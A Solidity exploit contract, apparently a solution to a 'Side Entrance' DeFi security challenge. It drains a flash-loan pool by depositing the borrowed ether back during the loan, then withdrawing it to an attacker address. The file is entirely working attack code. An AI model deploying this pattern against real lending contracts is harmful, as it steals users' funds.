// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEffect is IFlashLoanEtherReceiver {
    using Address for address payable;

    SideEntranceLenderPool internal immutable pool;
    address payable internal immutable attacker;

    constructor(address _pool, address _attacker) {
        pool = SideEntranceLenderPool(_pool);
        attacker = payable(_attacker);
    }

    function takeLoan() external {
        pool.flashLoan(address(pool).balance);
    }

    function execute() external payable {
        require(msg.sender == address(pool));
        pool.deposit{value: address(this).balance}();
    }

    function withdraw() external {
        pool.withdraw();
        attacker.sendValue(address(this).balance);
    }

    receive() external payable {}
}
